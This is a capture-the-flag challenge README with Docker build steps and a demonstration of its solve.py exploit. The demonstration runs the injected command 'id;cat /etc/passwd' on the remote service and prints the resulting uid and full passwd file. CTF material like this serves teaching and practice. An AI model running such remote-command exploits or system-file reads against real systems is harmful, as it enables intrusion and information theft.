# Chall 11 (Episode 6)

## Building / Running
```sh
$ cd deploy
$ docker build -t chall11 .
$ docker run -d -p 11535:1337/tcp chall11:latest
```

## Testing Exploit

By default the host and port are set to `challenge.pwny.racing` and `11535`. These can be overwritten by providing arguments to the `solve.py` script. There is also an optional third argument that will set the command to be executed on the remote host. By default the command is to run the `flag_submitter` as `test`.

```sh

$ cd solve
$ ./solve.py localhost 11535 'id;cat /etc/passwd'
...
uid=999(ctf) gid=999(ctf) groups=999(ctf)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
syslog:x:101:103::/home/syslog:/usr/sbin/nologin
messagebus:x:102:104::/nonexistent:/usr/sbin/nologin
ctf:x:999:999::/home/ctf:/bin/sh
```